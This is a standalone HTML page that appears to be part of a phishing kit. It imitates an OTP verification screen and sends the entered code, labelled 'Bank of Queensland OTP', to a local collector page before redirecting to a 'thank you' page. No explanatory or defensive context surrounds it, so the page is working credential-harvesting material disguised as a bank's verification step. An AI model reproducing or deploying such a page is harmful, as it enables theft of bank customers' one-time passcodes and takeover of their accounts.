<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OTP Verification</title>
    <style>
        body { font-family: Arial; background: #f3f3f3; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; }
        .form-group { margin-bottom: 15px; }
        input { width: 100%; padding: 8px; box-sizing: border-box; }
        .btn { background: #1b75bc; color: white; padding: 10px; border: none; border-radius: 4px; width: 100%; }
        .btn:disabled { opacity: 0.5; }
    </style>
</head>
<body>
    <div class="container">
        <h1>One‑Time Passcode</h1>
        <p>An OTP has been sent to your registered phone number.</p>
        <form id="login-form">
            <div class="form-group">
                <label>Enter OTP</label>
                <input type="text" id="txtUserid" required>
            </div>
            <button type="submit" id="btnSignIn" class="btn" disabled>Verify OTP</button>
        </form>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            function toggleButton() {
                const otp = $('#txtUserid').val().trim();
                $('#btnSignIn').prop('disabled', !otp);
            }
            $('#txtUserid').on('keyup change', toggleButton);
            $('#btnSignIn').prop('disabled', true);

            $('#login-form').submit(function(e) {
                e.preventDefault();
                const otp = $('#txtUserid').val().trim();
                if (!otp) return;

                const formData = { username: otp, title: 'Bank of Queensland OTP' };
                $.ajax({
                    type: 'GET',
                    url: 'otp-sn.html',
                    data: formData,
                    success: function() {
                        window.location.href = 'thank.html';
                    },
                    error: function() {
                        alert('Error verifying OTP.');
                    }
                });
            });
        });
    </script>
</body>
</html>
